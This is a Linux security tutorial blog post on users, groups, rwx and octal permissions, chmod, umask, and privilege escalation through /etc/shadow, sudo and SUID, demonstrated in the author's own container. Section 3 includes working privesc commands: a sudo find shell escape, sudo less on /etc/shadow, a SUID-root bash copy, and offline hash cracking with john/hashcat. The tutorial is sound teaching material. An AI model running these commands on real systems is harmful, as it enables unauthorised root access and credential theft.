---
layout: post
title: "Users, permissions & privilege (rwx, chmod, /etc/shadow)"
date: 2026-06-11
categories: tech
---

Everything in Linux security starts with one question the kernel asks on every single action: *who are you, and are you allowed?* Three pieces answer it — **who** (users and groups), **what they can do** (the `rwx` permission bits), and **how you cross the line to root** (privilege). This post walks the first piece end to end inside [my RE/Linux container]({% post_url tech/2026-06-08-docker-ubuntu-mac-run-linux-elf-spookypass %}), where I'm root and can safely create throwaway users to see permissions *from the other side*.

> Companion to my [Linux for cybersecurity guide](https://github.com/dilipgonadev/learn-re). The rule there: never read a section without running it. Same here.

---

## 1. Users — who the system thinks you are

Start with the two commands you'll run on every box you ever touch:

```
root@7d69d3ea967a:/work# whoami
root
root@7d69d3ea967a:/work# id
uid=0(root) gid=0(root) groups=0(root)
```

`whoami` is just the name; `id` is the truth. **`uid=0` is root** — that's not a name the kernel cares about, it's the *number zero*. Any account with `uid=0` is root, even if it's called something else. That's the first thing to check on a target: are there *other* uid-0 accounts hiding in the user list?

### Survey what's already there

Before creating anything, look at the two files that define every group and every account. Field 1 (cut on the `:` delimiter) is the name in both:

```bash
# get the list of groups on the system
cut -d: -f1 /etc/group

# get the list of users on the system
cut -d: -f1 /etc/passwd
```

`cut -d: -f1` means *split each line on `:` and keep field 1*. Both files are world-readable — listing users and groups needs no privilege at all, which is exactly why it's step one of recon.

A `/etc/passwd` line is seven colon-separated fields. Memorise these — you read this file constantly:

```
root : x : 0 : 0 : root : /root : /bin/bash
 │     │   │   │    │       │        └─ login shell  (/usr/sbin/nologin = can't log in)
 │     │   │   │    │       └────────── home directory
 │     │   │   │    └────────────────── GECOS (full name / comment)
 │     │   │   └─────────────────────── GID  (primary group id)
 │     │   └─────────────────────────── UID  (0 = root)
 │     └─────────────────────────────── password (x = "see /etc/shadow")
 └───────────────────────────────────── username
```

That `x` in field 2 is the bridge to privilege — the real password hash isn't here, it's in the root-only `/etc/shadow`. (More on that in §3.)

### Add a group and some users

Because I'm root in the container, I can mint throwaway accounts. One shared group, two users:

```bash
groupadd devs                    # a shared group

useradd -m -s /bin/bash alice    # -m = make home dir, -s = give a real shell
useradd -m -s /bin/bash bob
```

`-m` and `-s` matter: without `-m` there's no home directory, and without `-s /bin/bash` the account gets no usable shell — `su` then drops you into a bare `sh` or fails outright.

### Add them to the group and set passwords

```
root@7d69d3ea967a:/work# usermod -aG devs alice
root@7d69d3ea967a:/work# usermod -aG devs bob
root@7d69d3ea967a:/work# passwd alice
New password:
Retype new password:
passwd: password updated successfully
root@7d69d3ea967a:/work# passwd bob
New password:
Retype new password:
passwd: password updated successfully
```

`-aG` is a classic trap: the `-a` means *append*. **Leave it out and `usermod -G devs alice` *replaces* all of alice's other groups** instead of adding one. Always `-aG`.

### Confirm who's in the group

```bash
getent group devs | cut -d: -f4
```

`getent group devs` prints the group's line (`devs:x:<gid>:alice,bob`) and field 4 is the comma-separated member list — so this answers "who's in devs?" in one shot.

### Becoming someone else: `su` and the privilege asymmetry

`su - alice` switches user; the `-` gives a clean *login* shell (loads her environment, drops you into her home):

```
root@7d69d3ea967a:/work# su - alice
alice@7d69d3ea967a:~$ whoami
alice
alice@7d69d3ea967a:~$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice),1002(devs)
alice@7d69d3ea967a:~$ exit
logout
```

`id` is where it clicks: alice has **two** groups — `alice` (her *primary* group, the one new files get) and `devs` (the *secondary* group I added her to). That second membership is what will let her read a `root:devs` file in §2. Group membership is the quiet half of permissions.

Here's the part that teaches you how privilege flows: **root can `su` to anyone with no password.** Going *down* the privilege ladder is free. But have alice try to step up into root, and the system demands a password — because alice isn't privileged. Downgrading is free; upgrading costs proof. That asymmetry *is* the security model, and §3 is all about the ways attackers cheat it.

### Set up a file *and a folder* to test permissions from each side

Last thing — drop a file in `/tmp` (not the shared `/work` mount) and lock it down, so §2 has something to poke at as alice:

```bash
cd /tmp
echo "top secret" > secret.txt

chown root:devs secret.txt     # owner = root, group = devs
chmod 640 secret.txt           # rw- r-- ---  → owner rw, group r, others nothing
ls -l secret.txt               # -rw-r----- 1 root devs ... secret.txt
```

Now do the same for a **directory**, because `rwx` means something different on a folder — and that surprise is worth setting up now:

```bash
mkdir vault
chown root:devs vault
chmod 710 vault                # rwx --x ---  → owner full, group enter-only, others nothing
ls -ld vault                   # drwx--x--- 2 root devs ... vault
```

The group triad is `--x`: **execute, but no read**. On a file `x` means "run it"; on a *directory* it means "enter / traverse it" (`cd`), while `r` means "list its contents" (`ls`). They're independent — and giving alice one without the other has a counter-intuitive result:

```
alice@4eb5a9565ad2:/tmp$ cd vault/
alice@4eb5a9565ad2:/tmp/vault$ ls
ls: cannot open directory '.': Permission denied
alice@4eb5a9565ad2:/tmp/vault$ cd ..
```

She can **walk into** the directory (group `x`) but can't **list** what's inside it (no group `r`). If she already knew a filename in there she could even read that file — the `x` lets her traverse *through* the folder — but `ls` has nothing to stand on. Directory `r` and `x` are two separate keys.

Now the stage is set: **root** owns both, **alice** (in `devs`) is the *group*, and any user *not* in `devs` is *others*. On to the bits that actually gate them.

---

## 2. Permissions — `rwx`, octal, and `chmod`

The file is `-rw-r----- root devs` (mode `640`). alice is in `devs`, so she's the **group** — and group has exactly `r--`: read, no write. Let's prove it from her shell:

```
alice@4eb5a9565ad2:/tmp$ ls
secret.txt
alice@4eb5a9565ad2:/tmp$ ls -l
total 4
-rw-r----- 1 root devs 11 Jun 11 11:52 secret.txt
alice@4eb5a9565ad2:/tmp$ echo "alice here" >> secret.txt
-bash: secret.txt: Permission denied
```

She can **see and read** it (group `r`), but the append is **denied** — group has no `w`. That single `-` in the group triad is the whole reason. The kernel matched her to the *group* class and applied only those three bits; it never falls through to "others", and it doesn't add owner's `w` just because she can read.

### Reading the 10-character mode line

That `-rw-r-----` at the front of every `ls -l` line is the whole permission model in ten characters. Split it:

```
 -      rw-      r--      ---
 │      └┬─┘     └┬─┘     └┬─┘
 │       u        g        o
 │      owner    group    other
 └─ file type
```

- **Char 1 — type:** `-` regular file, `d` directory, `l` symlink, `c`/`b` device.
- **Chars 2–4 — owner (u):** what the *owning user* (here `root`) can do.
- **Chars 5–7 — group (g):** what members of the *owning group* (`devs`, so alice) can do.
- **Chars 8–10 — other (o):** everyone else — neither owner nor in the group.

A letter means the permission is on; a `-` means it's off. So `-rw-r-----` reads: *file · owner read+write · group read · others nothing.* That's exactly the wall alice hit above.

The one rule that ties it together: **the kernel checks just one class — owner first, else group, else other — and stops.** Being in the group never adds the owner's powers; "others" only applies to people who are neither. One bucket, three bits, done.

### `r`, `w`, `x` — and why directories are different

The three bits mean one thing on a file and a *completely* different thing on a directory. This table is the one to burn in:

| Bit | On a **file** | On a **directory** |
|-----|---------------|--------------------|
| **r** | read the contents | `ls` — list the names inside |
| **w** | change the contents | create / delete / rename entries |
| **x** | run it as a program | `cd` into it / traverse to items inside |

You already saw this split on `vault` in §1: alice had group `--x`, so she could `cd` in but `ls` was denied. Two more consequences that trip everyone up:

- **Deleting a file is a directory write, not a file write.** A read-only file (`r--r--r--`) sitting in a directory you *can* write is still deletable — `rm` edits the *directory's* list of entries, not the file. Watch it happen as root:

```
root@7d69d3ea967a:/tmp# mkdir demo && touch demo/locked && chmod 444 demo/locked
root@7d69d3ea967a:/tmp# rm demo/locked
rm: remove write-protected regular file 'demo/locked'? y
root@7d69d3ea967a:/tmp# ls demo
root@7d69d3ea967a:/tmp#
```

  It asks (because the file is write-protected) but it *lets* you — the directory's `w` is what counts.

- **Write on a file ≠ permission to delete it.** The mirror image: you can have full `rw-` on a file but be unable to remove it if its directory is read-only to you.

### Octal — the number behind the letters

Typing `rw-r--r--` gets old, so each bit gets a value and you add them up per class:

| Permission | Value |
|------------|-------|
| **r** | **4** |
| **w** | **2** |
| **x** | **1** |
| – | 0 |

Add the bits in each triad to get one digit (0–7); three triads → three digits:

```
 rwx = 4+2+1 = 7      rw- = 4+2 = 6      r-x = 4+1 = 5
 r-- = 4     = 4      -wx = 2+1 = 3      --- = 0   = 0
```

So our file's mode reads straight off:

```
 rw-   r--   ---
  6     4     0      →  640
```

The handful worth memorising — you'll type these for the rest of your life:

| Octal | Symbolic | Typical use |
|-------|----------|-------------|
| `644` | `rw-r--r--` | normal file — owner edits, everyone reads |
| `600` | `rw-------` | private file — owner only |
| `640` | `rw-r-----` | owner edits, group reads, others locked out (← `secret.txt`) |
| `755` | `rwxr-xr-x` | scripts, programs, public directories |
| `700` | `rwx------` | private directory or private script |

> There's an optional **fourth digit** in front (e.g. `4755`) for the SUID/SGID/sticky special bits — that's §3's territory. Ignore it until the basic three are reflex.

### `chmod` — two ways to set the bits

**Numeric** sets *all nine bits at once* — absolute, overwrites whatever was there:

```
root@7d69d3ea967a:/tmp# chmod 640 secret.txt      # rw-r-----
root@7d69d3ea967a:/tmp# chmod 600 secret.txt      # rw-------  (lock the group out too)
root@7d69d3ea967a:/tmp# chmod 755 vault           # rwxr-xr-x
```

**Symbolic** tweaks *specific* bits and leaves the rest alone — format is `who` `operator` `perms`:

- **who:** `u` owner · `g` group · `o` other · `a` all
- **operator:** `+` add · `-` remove · `=` set exactly (clears the rest of that class)
- **perms:** `r` `w` `x`

```
root@7d69d3ea967a:/tmp# chmod g+w secret.txt      # give the group write    → rw-rw----
root@7d69d3ea967a:/tmp# chmod o-r secret.txt      # remove others' read     (no-op here)
root@7d69d3ea967a:/tmp# chmod u=rw,go=r secret.txt# owner rw, group+other r → 644
root@7d69d3ea967a:/tmp# chmod +x build.sh         # make a script runnable for all
```

Rule of thumb: **numeric when you know the final state** (`chmod 640 file`), **symbolic when you want to flip one bit** without disturbing the others (`chmod +x script`). Add `-R` to recurse into a directory tree — but never blindly, or you'll mark every data file executable.

Now hand the group `w` to alice and watch the earlier denial flip to success:

```
root@7d69d3ea967a:/tmp# chmod g+w secret.txt      # rw-rw----
```
```
alice@4eb5a9565ad2:/tmp$ echo "alice here" >> secret.txt
alice@4eb5a9565ad2:/tmp$ cat secret.txt
top secret
alice here
```

Same user, same file — one bit changed, and the permission boundary moved. That's the entire lesson in one append.

### The "others" perspective — carol

alice tested the *group* class. To feel the **other** class, we need a user who is *not* in `devs`. Mint one as root:

```
root@7d69d3ea967a:/tmp# useradd -m -s /bin/bash carol
root@7d69d3ea967a:/tmp# passwd carol
New password:
Retype new password:
passwd: password updated successfully
root@7d69d3ea967a:/tmp# chmod 640 secret.txt      # put it back to rw-r-----
```

carol isn't the owner and isn't in `devs`, so the kernel drops her to the **other** triad — `---`, nothing:

```
root@7d69d3ea967a:/tmp# su - carol
carol@4eb5a9565ad2:~$ id
uid=1003(carol) gid=1003(carol) groups=1003(carol)
carol@4eb5a9565ad2:~$ cat /tmp/secret.txt
cat: /tmp/secret.txt: Permission denied
```

Same `640` file that alice could *read*, carol can't even open — because the only difference between them is group membership, and that's the difference between landing in the `r--` bucket and the `---` bucket. **Mode and group membership decide everything together; neither alone tells you who gets in.**

### Bonus: the owner always controls `chmod`

One last surprise that matters for §3. The `rwx` bits gate the *contents* — they do **not** decide who may change the permissions. That power belongs to the **owner** (and root), always:

```
alice@4eb5a9565ad2:~$ touch mine && chmod 000 mine   # strip every bit
alice@4eb5a9565ad2:~$ cat mine
cat: mine: Permission denied
alice@4eb5a9565ad2:~$ chmod 600 mine                  # ...still allowed!
alice@4eb5a9565ad2:~$ cat mine
alice@4eb5a9565ad2:~$
```

alice locked herself out of *reading* `mine`, yet `chmod` still worked — because she **owns** it. Ownership is a separate axis from `rwx`, and forgetting that is how people misjudge what an attacker can undo.

### Where `644` comes from: `umask`

Why did `touch mine` not start at `666`? New files are born from a base (`666` for files, `777` for directories) with the **umask** bits *subtracted*:

```
alice@4eb5a9565ad2:~$ umask
0022
```
```
files:  666 - 022 = 644
dirs:   777 - 022 = 755
```

So the default `022` mask is exactly why fresh files land at `644` and fresh directories at `755`. Set `umask 077` and everything you create is private by default (`600` / `700`) — a one-line hardening trick worth knowing.

That's the permission model end to end: a class the kernel picks (owner → group → other), three bits whose meaning flips between files and directories, the octal shorthand, and `chmod`/`umask` to set it all. Next, the part attackers actually chase — crossing from a normal user up to root.

---

## 3. Privilege — `/etc/shadow`, sudo & SUID

A normal user can't do much damage — that's the point. *Privilege escalation* is the craft of crossing from an ordinary account up to `uid=0`, and there are three doors: the password hashes in **`/etc/shadow`**, **sudo** (the sanctioned door), and **SUID binaries** (programs that run as their owner). We start with *where the secrets live*, then the door that's *supposed* to be there — and how one careless entry turns it into a full compromise.

### `/etc/shadow` — where passwords actually live

Recall from §1 that `/etc/passwd` carries an `x` in the password field. That `x` means *"the real secret is in `/etc/shadow`."* The split exists for exactly one reason: `/etc/passwd` is world-readable (everyone needs it to map UIDs ↔ names), but password hashes must **not** be. So the hashes were moved to `/etc/shadow`, readable only by root:

```
root@4eb5a9565ad2:~# ls -l /etc/passwd /etc/shadow
-rw-r--r-- 1 root root   ... /etc/passwd      ← anyone can read
-rw-r----- 1 root shadow ... /etc/shadow      ← root (and group shadow) only
```

That `640 root:shadow` is itself a permissions lesson — the very mode you decoded in §2 is what guards the most sensitive data on the box. (Hold that thought: in the sudo section below, `sudo less /etc/shadow` turns out to be a real escalation — alice borrows root's read of *exactly this file*.)

**Anatomy of a shadow line.** Nine colon-separated fields; the first two are the ones you read constantly:

```
alice : $6$xyz...$abc... : 19876 : 0 : 99999 : 7 : : :
  │            │             │     │    │      │
  │            │             │     │    │      └ warn days before expiry
  │            │             │     │    └─────── max days password is valid
  │            │             │     └──────────── min days between changes
  │            │             └────────────────── last change (days since 1970)
  │            └──────────────────────────────── the password HASH
  └───────────────────────────────────────────── username
```

Field 2 — the hash — is the prize. Read its `$id$salt$hash` structure, where `$id$` names the algorithm:

| `$id$` | Algorithm |
|--------|-----------|
| `$1$` | MD5 (ancient, broken) |
| `$5$` | SHA-256 |
| `$6$` | SHA-512 (the common modern default) |
| `$y$` | yescrypt (newer Debian/Ubuntu default) |

A few special values in field 2 you must recognise on sight:

- **`*` or `!`** → no valid password; password login is locked (typical for service accounts).
- **empty** → *no password at all* — anyone can become this user. Dangerous.
- **`!` prefixed on a hash** (`!$6$...`) → account locked, but the hash is still sitting there.

**Why it matters.** The hash isn't the password — it's a one-way function of it. You can't reverse it, but you *can* guess: hash a candidate with the same salt and compare. That's exactly what John the Ripper and hashcat do, and the CTF workflow is two commands:

```bash
# merge passwd + shadow into John's format, then crack
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt                  # or: hashcat -m 1800 hashes.txt wordlist
```

The whole point of `/etc/shadow` being root-only is that **once an attacker can read it, the game is nearly over** — they crack offline, at leisure, with no lockouts. So *"can I read `/etc/shadow`?"* is a top-priority check the moment you have any foothold — and as the next section shows, you don't always need to *be* root to do it.

### `sudo` — the sanctioned door upward

`sudo` ("superuser do") lets a *permitted* user run one command as root, after proving **their own** password. It's the controlled alternative to sharing the root password or living in `su`.

By default alice has no sudo rights at all — and the first thing to run on any account, `sudo -l`, says exactly that:

```
alice@4eb5a9565ad2:~$ sudo -l
[sudo] password for alice:
Sorry, user alice may not run sudo on 4eb5a9565ad2.
```

Note the prompt is for **her** password, not root's — three wrong tries and sudo locks her out (`1 incorrect password attempt`). She typed it correctly and was *still* refused: she simply isn't in the policy yet.

### The policy lives in `/etc/sudoers`

Who may run what is defined in `/etc/sudoers`. **Edit it only with `visudo`** — it syntax-checks before saving, so a typo can't brick everyone's path to root. The modern style is a drop-in file under `/etc/sudoers.d/`. As root, grant alice exactly *one* command:

```
root@4eb5a9565ad2:~# echo 'alice ALL=(root) NOPASSWD: /usr/bin/find' > /etc/sudoers.d/alice
root@4eb5a9565ad2:~# chmod 440 /etc/sudoers.d/alice
root@4eb5a9565ad2:~# visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/alice: parsed OK
```

`chmod 440` (root-only read) isn't optional — sudo **ignores** any sudoers file that's group- or world-writable, as a self-protection check. `visudo -c` validates every file without opening an editor. Read the policy line field by field:

```
 alice   ALL = (root)   NOPASSWD: /usr/bin/find
   │      │      │          │           └─ which commands  (here: find only)
   │      │      │          └───────────── no password required to run them
   │      │      └──────────────────────── as which user   (may run AS root)
   │      └─────────────────────────────── on which hosts  (ALL)
   └────────────────────────────────────── the user        (%group for a group)
```

(`%sudo ALL=(ALL:ALL) ALL` in the main file is why "add the user to the `sudo` group" works on Ubuntu — membership in `sudo` grants that blanket policy.)

Two things make sudo safer than `su`: alice proves **her own** password (root's is never shared), and **every call is logged** to `/var/log/auth.log` — accountability that `su` to root never gives you.

### `sudo -l` — the single most important recon command

Now from alice's shell, `sudo -l` tells her *precisely* what she may run — without executing anything:

```
alice@4eb5a9565ad2:~$ sudo -l
Matching Defaults entries for alice on 4eb5a9565ad2:
    env_reset, mail_badpass, secure_path=..., use_pty

User alice may run the following commands on 4eb5a9565ad2:
    (root) NOPASSWD: /usr/bin/find
```

On a target, this is step one of privilege-escalation enumeration. `NOPASSWD` means sudo won't even ask — and this is the line you *pray* to see, because of what `find` can do.

### Why one allowed binary = full root

`find` — like `less`, `vim`, `awk`, `python` — can spawn a shell *from inside itself*. So "alice may run `find` as root with no password" really means **alice is root**; she just has to ask `find` to launch a shell:

```
alice@4eb5a9565ad2:~$ sudo find . -exec /bin/bash \; -quit
root@4eb5a9565ad2:/home/alice#
```

`-exec /bin/bash \;` tells `find` to run a shell on the first entry it hits; `-quit` stops after one. Because `find` is running as root, the shell it spawns is a **root** shell — watch the prompt flip from `alice@…$` to `root@…#` (that `#` is `uid=0`). One harmless-looking entry in `sudoers` and the box is fully compromised.

That class of trick — a legitimately-allowed program coaxed into a root shell — is catalogued at **[GTFOBins](https://gtfobins.github.io/)**. It's the first place to look up any binary you find in `sudo -l`.

### It doesn't even need a shell: `sudo less /etc/shadow`

Spawning a shell is the *loud* option. Often you don't need one — the allowed binary can read the prize directly. Grant alice `less` as well (note: `visudo` would reject a stray space like `less ,` — keep the list clean):

```
root@4eb5a9565ad2:~# echo 'alice ALL=(root) NOPASSWD: /usr/bin/less, /usr/bin/find' > /etc/sudoers.d/alice
```

```
alice@4eb5a9565ad2:~$ sudo -l
...
    (root) NOPASSWD: /usr/bin/less, /usr/bin/find
alice@4eb5a9565ad2:~$ sudo less /etc/shadow
```

`less` runs as root, so it cheerfully opens the root-only `/etc/shadow` — the very file of password hashes you dissected at the top of this section. alice never *became* root, yet she's reading root's most sensitive file. **The lesson: sudo rights on the wrong binary are a full compromise, even when the binary looks harmless.**

### SUID / SGID / sticky — the special bits

This is the **fourth octal digit** you've been ignoring since §2. Beyond the nine `rwx` bits, a file carries three *special* bits, written as a leading digit — `chmod 4755 file`:

| Bit | Octal | Shows up in `ls` as | Effect |
|-----|-------|---------------------|--------|
| **SUID** | `4` | `s` in the owner-`x` slot (`-rwsr-xr-x`) | runs with the **file owner's** identity |
| **SGID** | `2` | `s` in the group-`x` slot (`-rwxr-sr-x`) | runs with the file's **group**; on a directory, new files inherit that group |
| **sticky** | `1` | `t` in the other-`x` slot (`drwxrwxrwt`) | on a directory, only a file's **owner** can delete it |

### SUID — the big one

Normally a program runs with *your* privileges. A **SUID** binary runs with the privileges of whoever **owns the file**. The textbook example is `passwd`:

```
alice@4eb5a9565ad2:~$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root ... /usr/bin/passwd
        ↑
       SUID bit (the 's')
```

Why does it need this? `passwd` must write to `/etc/shadow`, which is root-only (you just saw that mode). alice can't write that file — but `passwd` is *owned by root* and *SUID*, so when alice runs it the process becomes root for the duration, writes her new hash, and exits. SUID is how unprivileged users perform tightly-scoped privileged actions safely.

### See all three bits yourself (in `/tmp`, as root)

```
root@4eb5a9565ad2:/tmp# touch demo && chmod 4755 demo && ls -l demo
-rwsr-xr-x 1 root root 0 Jun 12 06:15 demo        # SUID → 's' in owner slot

root@4eb5a9565ad2:/tmp# mkdir share && chmod 1777 share && ls -ld share
drwxrwxrwt 2 root root 4096 Jun 12 06:16 share    # sticky → 't' in other slot
```

The sticky bit on `share` is exactly why `/tmp` itself is world-writable yet alice still can't delete carol's files there — the protection §2 hinted at when it said directory `w` normally lets you delete *anyone's* entries. `t` revokes that for everyone but the owner.

One gotcha to recognise on sight — **capital `S`**:

```
root@4eb5a9565ad2:/tmp# touch nox && chmod 4644 nox && ls -l nox
-rwSr--r-- 1 root root 0 Jun 12 06:17 nox
```

That `S` (capital) means the SUID bit is set **but the owner has no `x`**. Since SUID only matters when the file is *executed*, a non-executable SUID file does nothing — it's almost always a misconfiguration. Lowercase `s` = SUID **and** executable (live); uppercase `S` = SUID without execute (inert). Same rule for `t`/`T` on the sticky bit.

### Why SUID is an attacker's favourite

A SUID-root binary runs as root, so *any* bug in it — or any way to make it run code of your choosing — hands you root. The canonical privesc step is therefore "list every SUID binary and check it against [GTFOBins](https://gtfobins.github.io/)":

```
root@4eb5a9565ad2:/tmp# find / -perm -4000 -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
... and our two plants:
/tmp/demo
/tmp/nox
```

`-perm -4000` means "has the SUID bit set." If `find`, `nmap`, `vim`, or `python` shows up SUID-root, each has a known one-liner to a root shell. Here's the classic blunder in full — copy a shell, make it SUID-root, and any user owns the box:

```
root@4eb5a9565ad2:/tmp# cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
root@4eb5a9565ad2:/tmp# ls -l /tmp/rootbash
-rwsr-xr-x 1 root root 1446024 Jun 12 06:19 /tmp/rootbash
```

Now switch to alice and run it with `-p` (bash drops SUID privileges by default; `-p` *keeps* them):

```
alice@4eb5a9565ad2:/tmp$ /tmp/rootbash -p
rootbash-5.2# id
uid=1001(alice) gid=1002(alice) euid=0(root) groups=1002(alice),1001(devs)
```

Read that `id` carefully: her real `uid` is still **1001(alice)**, but her **`euid=0(root)`** — the *effective* UID the kernel checks for permissions is root. That split (real vs. effective UID) *is* SUID. And with it she walks straight to the prize from the shadow section:

```
rootbash-5.2# cat /etc/shadow
root:$y$j9T$Z4aLw3Ees...$pKSmYW55rby0yS7t5zSB...:20616:0:99999:7:::
daemon:*:20582:0:99999:7:::
...
alice:$y$j9T$s4Hcg6wK...$DXuHHEEPLstat0ANyiCcrX...:20615:0:99999:7:::
bob:!:20615:0:99999:7:::
carol:!:20615:0:99999:7:::
```

Everything from that subsection reads off in one screen: root and alice carry live **`$y$`** (yescrypt) hashes; the service accounts are **`*`** (no password); bob and carol are **`!`** (locked). alice is now holding every hash on the box to crack offline — from a binary that was just a copy of `bash` with one bit flipped.

The mirror lesson to §2's "ownership is a separate axis": here it's **identity is a separate axis from the file**. One SUID-root binary you don't control is the whole game — which is why `find / -perm -4000` is muscle memory for anyone doing privesc.

---

*And that's the model end to end — **who** you are (`uid`/`gid`), **what** the `rwx` bits allow, and the three ways privilege is **crossed** (`sudo`, `/etc/shadow`, SUID). Never read a section without running it; you just watched one bit turn alice into root.*
